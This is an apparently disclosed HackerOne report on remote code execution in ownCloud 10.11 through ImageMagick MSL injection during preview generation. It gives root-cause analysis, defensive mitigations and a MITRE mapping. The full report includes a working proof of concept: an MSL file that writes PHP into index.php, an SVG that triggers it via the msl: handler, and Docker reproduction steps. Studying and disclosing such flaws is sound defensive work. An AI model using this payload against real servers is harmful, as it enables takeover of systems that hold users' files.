# Remote Code Execution on ownCloud via ImageMagick MSL Injection

## Metadata
- **Source:** HackerOne
- **Report:** 1838674 | https://hackerone.com/reports/1838674
- **Submitted:** 2023-01-18
- **Reporter:** lukasreschke
- **Program:** ownCloud
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Remote Code Execution, Arbitrary File Write, Unsafe Image Processing, MSL (Magick Scripting Language) Injection
- **CVEs:** None
- **Category:** memory-binary

## Summary
ownCloud instances with ImageMagick installed are vulnerable to remote code execution through malicious MSL (Magick Scripting Language) files uploaded by attackers. The vulnerability exists because ownCloud uses ImageMagick for preview generation without proper sanitization of image file inputs. An attacker can upload an MSL file disguised as an image, which is then processed by ImageMagick, allowing arbitrary file writes and code execution.

## Attack scenario
1. Attacker identifies an ownCloud instance with ImageMagick installed (either through public documentation or reconnaissance)
2. Attacker gains file upload capability via File Drop Folders feature or by creating a user account
3. Attacker creates a malicious MSL file containing ImageMagick commands to read, manipulate, and write files (e.g., writing PHP code to index.php)
4. Attacker uploads the MSL file as an image file (e.g., exploit.msl) along with a legitimate image file to trigger preview generation
5. When preview generation is triggered (via page reload or explicit preview request), ownCloud's OC\Preview\Bitmap class processes the files using ImageMagick
6. ImageMagick interprets and executes the MSL commands, writing arbitrary PHP code to web-accessible locations, achieving remote code execution

## Root cause
The root cause is the unsafe processing of user-uploaded files by ImageMagick without proper input validation or sandboxing. The OC\Preview\Bitmap class directly passes file paths to ImageMagick without verifying file contents or restricting MSL functionality. ImageMagick's MSL language allows file I/O operations (read/write), which should be disabled for untrusted input. Additionally, the attacker's knowledge of the file path on disk enables targeted exploitation.

## Attacker mindset
An attacker with this knowledge would recognize that any application using ImageMagick for user-supplied image processing is potentially vulnerable to MSL injection. They understand that ImageMagick's MSL language is a powerful scripting engine that can perform file operations, making it dangerous when processing untrusted input. The attacker leverages the common ownCloud deployment pattern where file paths are predictable and ImageMagick is installed per documentation, reducing reconnaissance requirements.

## Defensive takeaways
- Disable ImageMagick's MSL, URL, and other dangerous delegates when processing user-supplied images; use policy.xml to restrict allowed operations
- Implement strict file type validation based on content (magic bytes) rather than extension alone
- Run ImageMagick in a sandboxed environment with minimal file system permissions
- Store uploaded files outside the web root or in a directory where PHP execution is disabled
- Implement a whitelist of allowed image formats and reject files attempting to use scripting languages
- Use safer image processing libraries where possible, or run ImageMagick with disabled scripting (convert -script off or policy restrictions)
- Validate and sanitize all file paths before passing them to external tools
- Apply principle of least privilege: ImageMagick process should not have write access to application files

## Variant hunting
Search for similar vulnerabilities in: (1) Other applications using ImageMagick for user-supplied image processing (Nextcloud, Mediawiki, etc.); (2) Any system accepting image uploads with preview generation features; (3) Applications using other image processing tools that support scripting (GraphicsMagick, FFmpeg with unsafe filters); (4) CMS platforms with image manipulation features; (5) Cloud storage solutions with thumbnail generation; (6) Web applications with avatar/profile picture uploads

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1434 - External Remote Services (File Drop Folders as entry point)
- T1583.002 - Acquire Infrastructure (reconnaissance of ownCloud instances)
- T1059.007 - Command and Scripting Interpreter (Magick Scripting Language)
- T1105 - Ingress Tool Transfer (uploading malicious files)
- T1059.004 - Command and Scripting Interpreter (PHP execution)
- T1491.001 - Defacement (potential secondary impact)

## Notes
This vulnerability requires the convergence of three factors: (1) ImageMagick installation, (2) file upload capability, and (3) knowledge of file paths. The use of Docker and predictable paths makes this especially exploitable in containerized ownCloud deployments. The MSL language feature of ImageMagick is powerful but dangerous with untrusted input. ImageMagick has a documented history of security issues with image processing; organizations should consider policy.xml restrictions as a baseline mitigation. The vulnerability affects ownCloud 10.11 and potentially many other versions. Remediation requires both application-level fixes (disabling dangerous image operations) and infrastructure-level mitigations (ImageMagick policy restrictions).

## Full report
<details><summary>Expand</summary>

It is possible to execute code on ownCloud instances which have ImageMagick installed. This is due to the usage of ImageMagick for preview generation for some file types. (anything using [`OC\Preview\Bitmap`](https://github.com/owncloud/core/blob/83f600f8b89b62d52248dfdbc7046567be024b67/lib/private/Preview/Bitmap.php#L84-L92))

The prerequisite for exploitation seem to be:

- ImageMagick is installed (e.g. as [described in the ownCloud documentation](https://doc.owncloud.com/server/10.10/admin_manual/installation/manual_installation/manual_imagick7.html))
- The attacker knows the file path of a file that they uploaded (e.g. `/mnt/data/files/`)
- The attacker is able to upload files to the system (e.g. by using [File Drop Folders](https://owncloud.com/features/file-drop-folders/) or having an account)

To reproduce we have provided the following files:

- F2127559
```
FROM owncloud/server:10.11
RUN apt-get update && apt-get install -y imagemagick
```

- F2127558
```
<?xml version="1.0" encoding="UTF-8"?>
<image> 
  <read filename="/mnt/data/files/admin/files/Photos/Portugal.jpg" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <comment>&lt;?php echo php_uname(); ?&gt;</comment>
  <write filename="/var/www/owncloud/index.php" />
</image>
```

- F2127557
```
<svg width="1000" height="1000" 
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">       
<image xlink:href="msl:/mnt/data/files/admin/files/exploit.msl" height="500" width="500"/>
</svg>
```

Download these files and then perform the following steps:

- Build the docker image
   - `docker build . -t owncloud-imagemagick`
- Start the docker image
   - `docker run --rm --name oc-eval -d -p8080:8080 owncloud-imagemagick:latest`
- Open the ownCloud instance at localhost:8080 and login using the username “admin” and the password “admin”.
   - Upload the file exploit.msl
   - Upload the file image.rgb
- Reload the page, at this point you will be served the new rewritten index.php that will also perform the phpinfo() command. (you can change which file should be overwritten and what PHP code will be executed inside exploit.msl)

{F2127565}

## Impact

Attackers that are able to upload files to a ownCloud instance with ImageMagick installed can execute arbitrary code on the system.

</details>

---
*Analysed by Claude on 2026-05-12*
